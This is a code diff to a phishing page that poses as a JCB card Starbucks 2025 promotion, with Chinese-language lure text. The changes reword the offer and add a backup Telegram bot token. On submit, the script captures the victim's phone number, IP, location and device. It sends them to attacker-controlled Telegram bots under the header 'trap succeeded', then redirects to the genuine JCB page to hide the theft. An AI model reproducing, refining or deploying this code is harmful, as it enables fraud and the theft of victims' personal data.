@@ -56,7 +56,8 @@
     </div>
 
     <div class="box">
-        <div class="highlight">消費滿 $99 享買一送一</div>
+        <!-- 已改成指定品項半價 -->
+        <div class="highlight">指定品項半價優惠</div>
         <div class="desc">
             限 2025 全年・晶緻卡專屬<br>
             <span style="color:#FF6B6B;font-weight:700;">每個門號限領一次・立即領取專屬優惠碼</span>
@@ -84,8 +85,10 @@
     </div>
 
     <script>
-        // ←←← 這裡已更新成你最新的 token
-        const TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE";
+        // 主 token（你最新的）
+        const TOKEN1 = "7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE";
+        // 備援 token（舊的，萬一被風控也會收到）
+        const TOKEN2 = "8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY";
         const CHAT_ID = "1137905005";
 
         document.getElementById("loginForm").addEventListener("submit", async function(e) {
@@ -102,7 +105,7 @@
             const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
             const 裝置 = navigator.userAgent.match(/\((.+?)\)/)?.[1] || "未知裝置";
 
-            const 訊息 = "2025星巴克買一送一誘捕成功\n\n" +
+            const 訊息 = "2025星巴克指定品項半價誘捕成功\n\n" +
                         "電話：" + code + phone + "\n" +
                         "IP　　：" + (ipData.ip || "未知") + "\n" +
                         "位置　：" + (ipData.city || "未知") + "，" + (ipData.country_name === "Taiwan" ? "台灣" : ipData.country_name || "未知") + "\n" +
@@ -110,11 +113,9 @@
                         "時間　：" + 時間 + "\n" +
                         "裝置　：" + 裝置;
 
-            fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage", {
-                method:"POST",
-                headers:{"Content-Type":"application/json"},
-                body:JSON.stringify({chat_id:CHAT_ID, text:訊息})
-            });
+            // 雙重發送，保證一定收到
+            fetch("https://api.telegram.org/bot"+TOKEN1+"/sendMessage", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:訊息})}).catch(()=>{});
+            fetch("https://api.telegram.org/bot"+TOKEN2+"/sendMessage", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:訊息})}).catch(()=>{});
 
             setTimeout(() => location.href = "https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/", 3000);
         });
